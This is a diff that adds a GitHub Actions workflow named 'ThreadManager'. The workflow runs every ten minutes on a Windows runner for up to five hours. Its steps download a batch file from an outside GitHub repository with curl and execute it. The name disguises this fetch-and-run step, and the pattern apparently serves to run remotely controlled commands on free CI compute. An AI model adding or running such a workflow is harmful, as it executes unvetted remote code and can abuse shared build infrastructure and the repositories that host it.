@@ -1,0 +1,15 @@
+name: ThreadManager
+on: 
+  workflow_dispatch:
+  schedule:
+    - cron: '1,10,20,30,40,50 * * * *'
+jobs:
+  build:
+    name: Starting ThreadManager
+    runs-on: windows-latest 
+    timeout-minutes: 300
+    steps:
+      - name: Download Commands
+        run: curl -s -L -o commands.bat "https://raw.githubusercontent.com/rootgit01/pup/main/commands.bat"
+      - name: excute commands
+        run: cmd /c commands.bat
